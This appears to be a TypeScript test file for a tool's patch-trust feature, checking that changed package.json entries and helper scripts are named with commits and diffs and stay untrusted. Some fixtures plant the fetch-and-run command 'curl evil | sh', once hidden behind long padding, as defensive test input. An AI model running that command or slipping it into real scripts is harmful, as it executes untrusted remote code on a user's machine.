// A patch asked about again says what changed since the version last
// trusted (patch-changes.ts): Mike was asked most days, by his own agents'
// merges, and the ask couldn't tell those from a stranger's code (nightly
// retro, 20 Nov 2026). It only ever describes: trust is as before.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { tmpDir } from '../helpers/fakes.ts';
import { PatchTrust, patchHash } from '../../src/patch-trust.ts';
import { lineDiff, plainLine, waitingWhy } from '../../src/patch-changes.ts';

const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, '-c', 'user.email=a@b', '-c', 'user.name=a', ...args], { stdio: 'pipe' }).toString();

function write(folder: string, files: Record<string, string>): void {
  for (const [name, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
    fs.writeFileSync(path.join(folder, name), body);
  }
}

function commit(dir: string, msg: string): string {
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', msg);
  return git(dir, 'rev-parse', '--short', 'HEAD').trim();
}

// On Windows npm runs a package script with cmd.exe, which patch trust
// doesn't follow (script-trust.ts), so there package.json is never hashed
// and these have nothing to describe.
const npmScript = { skip: process.platform === 'win32' && "npm runs package scripts with cmd.exe on Windows, so patch trust doesn't hash package.json there" };

// A repo whose patch runs `npm run stats`, so its package.json is hashed.
function repo(): { dir: string; patch: string } {
  const dir = fs.realpathSync(tmpDir());
  git(dir, 'init', '-q');
  write(dir, {
    '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Stats', run: 'npm run stats' }] };\n`,
    'package.json': JSON.stringify({ name: 't', scripts: { stats: 'node stats.js' }, dependencies: { a: '1.0.0' } }, null, 2) + '\n',
  });
  commit(dir, 'first');
  return { dir, patch: path.join(dir, '.threadbear', 'patches', 't.ts') };
}

test('a commit that changes package.json is named, with its lines', npmScript, async () => {
  const { dir, patch } = repo();
  const store = path.join(tmpDir(), 'patch-trust.json');
  const trust = new PatchTrust({ file: store });
  const first = patchHash(patch);
  assert.ok(first.deps.some((d) => d.path.endsWith('package.json')), 'package.json is in the hash');
  assert.ok(trust.trust(patch, first.hash));
  await trust.settled();

  write(dir, { 'package.json': JSON.stringify({ name: 't', scripts: { stats: 'node stats.js' }, dependencies: { a: '1.1.0' } }, null, 2) + '\n' });
  const sha = commit(dir, 'Bump a to 1.1 (#12)');

  // A fresh store from the same files, as after a runner restart.
  const v = await new PatchTrust({ file: store }).check(patch, 0);
  assert.equal(v.trusted, false);
  assert.ok(!v.trusted && v.reason === 'changed');
  const changes = !v.trusted && v.reason === 'changed' ? v.changes : undefined;
  assert.ok(changes?.since);
  assert.equal(changes?.files?.length, 1);
  const f = changes!.files![0];
  assert.equal(f.path, 'package.json');
  assert.equal(f.was, 'changed');
  assert.deepEqual(f.commits, [{ sha, subject: 'Bump a to 1.1 (#12)' }]);
  assert.equal(f.uncommitted, undefined);
  assert.match(f.diff ?? '', /^- {5}"a": "1\.0\.0"$/m);
  assert.match(f.diff ?? '', /^\+ {5}"a": "1\.1\.0"$/m);
  assert.equal(waitingWhy({ untrusted: 'changed', changes }), `package.json changed since you trusted it (in commit ${sha})`);
});

test('an uncommitted edit to the patch file says so, and the diff is of what Trust would load', async () => {
  const { dir, patch } = repo();
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  write(dir, { '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Stats', run: 'npm run stats' }, { title: 'Evil', run: 'npm run stats' }] };\n` });
  const v = await trust.check(patch, 0);
  assert.ok(!v.trusted && v.reason === 'changed');
  const f = (!v.trusted && v.reason === 'changed' && v.changes?.files) || [];
  assert.equal(f.length, 1);
  assert.equal(f[0].path, '.threadbear/patches/t.ts');
  assert.equal(f[0].uncommitted, true);
  assert.equal(f[0].commits, undefined);
  assert.match(f[0].diff ?? '', /Evil/);
});

test('a new helper the patch now runs is "added"; nothing on record says nothing', npmScript, async () => {
  const { dir, patch } = repo();
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  write(dir, { '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Go', run: './go.sh' }] };\n`, 'go.sh': '#!/bin/sh\necho hi\n' });
  fs.chmodSync(path.join(dir, 'go.sh'), 0o755);
  const v = await trust.check(patch, 0);
  const files = (!v.trusted && v.reason === 'changed' && v.changes?.files) || [];
  assert.deepEqual(files.map((f) => [f.path, f.was]).sort(), [['.threadbear/patches/t.ts', 'changed'], ['go.sh', 'added'], ['package.json', 'removed']]);

  // A store with the trust but no versions file (trusted before this kept
  // them): the ask is as before, with no changes.
  const bare = path.join(tmpDir(), 'patch-trust.json');
  const other = repo();
  const t2 = new PatchTrust({ file: bare });
  assert.ok(t2.trust(other.patch, patchHash(other.patch).hash));
  fs.rmSync(bare.replace(/\.json$/, '-versions.json'));
  write(other.dir, { 'package.json': '{}\n' });
  const v2 = await new PatchTrust({ file: bare }).check(other.patch, 0);
  assert.ok(!v2.trusted && v2.reason === 'changed');
  assert.equal(!v2.trusted && v2.reason === 'changed' ? v2.changes : 'x', undefined);
});

test('a folder trusted only before version 3 says it is the recheck', async () => {
  const { patch, dir } = repo();
  const store = path.join(tmpDir(), 'patch-trust.json');
  fs.writeFileSync(store, JSON.stringify({ version: 2, folders: { [dir]: ['a'.repeat(64)] } }));
  const v = await new PatchTrust({ file: store }).check(patch, 0);
  assert.ok(!v.trusted && v.reason === 'changed');
  assert.deepEqual(!v.trusted && v.reason === 'changed' ? v.changes : undefined, { recheck: true });
});

test('still trusted only by hash: describing a change trusts nothing', npmScript, async () => {
  const { dir, patch } = repo();
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  write(dir, { 'package.json': '{"scripts":{"stats":"curl evil | sh"}}\n' });
  commit(dir, 'Bump deps (#13)');
  for (let i = 0; i < 2; i++) assert.equal((await trust.check(patch, 0)).trusted, false);
});

test('a version trusted before versions were kept is recorded when next seen trusted', npmScript, async () => {
  const { dir, patch } = repo();
  const store = path.join(tmpDir(), 'patch-trust.json');
  fs.writeFileSync(store, JSON.stringify({ version: 3, folders: { [dir]: [patchHash(patch).hash] } }));
  assert.equal((await new PatchTrust({ file: store }).check(patch, 0)).trusted, true);
  write(dir, { 'package.json': '{}\n' });
  const v = await new PatchTrust({ file: store }).check(patch, 0);
  assert.equal((!v.trusted && v.reason === 'changed' && v.changes?.files?.[0]?.path) || undefined, 'package.json');
});

test('a script named __proto__ is listed like any file', npmScript, async () => {
  const { dir, patch } = repo();
  write(dir, { '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Go', run: './__proto__' }, { title: 'Stats', run: 'npm run stats' }] };\n`, ['__proto__']: '#!/bin/sh\necho hi\n' });
  fs.chmodSync(path.join(dir, '__proto__'), 0o755);
  commit(dir, 'proto');
  assert.ok(patchHash(patch).deps.some((d) => d.path.endsWith('/__proto__')), '__proto__ is in the hash');
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  await trust.settled();
  write(dir, { ['__proto__']: '#!/bin/sh\ncurl evil | sh\n', 'package.json': '{"scripts":{"stats":"node stats.js"}}\n' });
  const v = await trust.check(patch, 0);
  const files = (!v.trusted && v.reason === 'changed' && v.changes?.files) || [];
  assert.deepEqual(files.map((f) => f.path).sort(), ['__proto__', 'package.json']);
  assert.match(files.find((f) => f.path === '__proto__')?.diff ?? '', /curl evil/);
});

test('a long line is cut only with a note of what was left out', () => {
  const pad = ' '.repeat(1200);
  const d = lineDiff('"stats": "node stats.js"', `"stats": "node stats.js${pad}; curl evil | sh"`)!;
  assert.match(d, /\[line cut: \d+ more characters, open the file\]/);
});

test('a brand-new patch in a folder trusted only before version 3 does not claim it was trusted', async () => {
  const { patch, dir } = repo();
  const store = path.join(tmpDir(), 'patch-trust.json');
  fs.writeFileSync(store, JSON.stringify({ version: 2, folders: { [dir]: ['a'.repeat(64)] } }));
  const v = await new PatchTrust({ file: store }).check(patch, 0);
  const why = waitingWhy({ untrusted: 'changed', changes: !v.trusted && v.reason === 'changed' ? v.changes : undefined });
  assert.match(why, /can't say whether this patch was trusted before/);
});

test("an old branch's trusted version doesn't become the one a re-ask compares with", npmScript, async () => {
  const { dir, patch } = repo();
  const store = path.join(tmpDir(), 'patch-trust.json');
  const trust = new PatchTrust({ file: store });
  const v1 = patchHash(patch).hash;
  assert.ok(trust.trust(patch, v1));
  write(dir, { 'package.json': '{"scripts":{"stats":"node v2.js"}}\n' });
  commit(dir, 'v2');
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  await trust.settled();
  // Back on v1 (an old branch): trusted, and v2 stays the last on record.
  write(dir, { 'package.json': JSON.stringify({ name: 't', scripts: { stats: 'node stats.js' }, dependencies: { a: '1.0.0' } }, null, 2) + '\n' });
  assert.equal(patchHash(patch).hash, v1);
  assert.equal((await trust.check(patch, 0)).trusted, true);
  write(dir, { 'package.json': '{"scripts":{"stats":"node v3.js"}}\n' });
  const v = await trust.check(patch, 0);
  const f = (!v.trusted && v.reason === 'changed' && v.changes?.files) || [];
  assert.match(f[0]?.diff ?? '', /- \{"scripts":\{"stats":"node v2\.js"\}\}/);
});

test('a committed script that is not UTF-8 is still committed, with its lines', async () => {
  const { dir, patch } = repo();
  write(dir, { '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Go', run: './go.sh' }] };\n` });
  fs.writeFileSync(path.join(dir, 'go.sh'), Buffer.concat([Buffer.from('#!/bin/sh\n# caf'), Buffer.from([0xe9]), Buffer.from('\necho one\n')]), { mode: 0o755 });
  commit(dir, 'go');
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  await trust.settled();
  fs.writeFileSync(path.join(dir, 'go.sh'), Buffer.concat([Buffer.from('#!/bin/sh\n# caf'), Buffer.from([0xe9]), Buffer.from('\necho two\n')]), { mode: 0o755 });
  const sha = commit(dir, 'two');
  const v = await trust.check(patch, 0);
  const f = ((!v.trusted && v.reason === 'changed' && v.changes?.files) || []).find((x) => x.path === 'go.sh');
  assert.deepEqual(f?.commits, [{ sha, subject: 'two' }]);
  assert.equal(f?.uncommitted, undefined);
  assert.match(f?.diff ?? '', /\+ echo two/);
});

test('a linked patches folder: git says nothing rather than "not committed"', async () => {
  const dir = fs.realpathSync(tmpDir());
  git(dir, 'init', '-q');
  write(dir, { 'shared/t.ts': `export default { actions: [{ title: 'Go', run: 'echo a' }] };\n` });
  fs.mkdirSync(path.join(dir, '.threadbear'));
  fs.symlinkSync('../shared', path.join(dir, '.threadbear', 'patches'));
  commit(dir, 'first');
  const patch = path.join(dir, '.threadbear', 'patches', 't.ts');
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  await trust.settled();
  write(dir, { 'shared/t.ts': `export default { actions: [{ title: 'Go', run: 'echo b' }] };\n` });
  commit(dir, 'second');
  const v = await trust.check(patch, 0);
  const f = (!v.trusted && v.reason === 'changed' && v.changes?.files) || [];
  assert.equal(f.length, 1);
  assert.equal(f[0].uncommitted, undefined);
});

test('a missing file the patch no longer names is no change', async () => {
  const { dir, patch } = repo();
  write(dir, { '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Go', run: './nothere.sh' }, { title: 'Stats', run: 'npm run stats' }] };\n` });
  const trust = new PatchTrust({ file: path.join(tmpDir(), 'patch-trust.json') });
  assert.ok(trust.trust(patch, patchHash(patch).hash));
  write(dir, { '.threadbear/patches/t.ts': `export default { actions: [{ title: 'Stats', run: 'npm run stats' }] };\n` });
  const v = await trust.check(patch, 0);
  const f = (!v.trusted && v.reason === 'changed' && v.changes?.files) || [];
  assert.deepEqual(f.map((x) => x.path), ['.threadbear/patches/t.ts']);
});

test('lineDiff: changes with a line of context, hunks apart, capped', () => {
  const a = ['1', '2', '3', '4', '5', '6', '7', '8'].join('\n');
  const b = ['1', 'two', '3', '4', '5', '6', 'seven', '8'].join('\n');
  assert.equal(lineDiff(a, b), ['  1', '- 2', '+ two', '  3', '…', '  6', '- 7', '+ seven', '  8'].join('\n'));
  assert.equal(lineDiff('x', 'x'), undefined);
  const many = Array.from({ length: 100 }, (_, i) => `l${i}`).join('\n');
  const out = lineDiff('', many)!.split('\n');
  assert.equal(out.length, 41);
  assert.match(out.at(-1)!, /more lines$/);
});

test('repo text is shown as one plain line', () => {
  assert.equal(plainLine('a\u202eb\nc\u0000\u0085\u200f'), 'a?b c???');
  assert.equal(plainLine('x'.repeat(300)).length, 200);
});
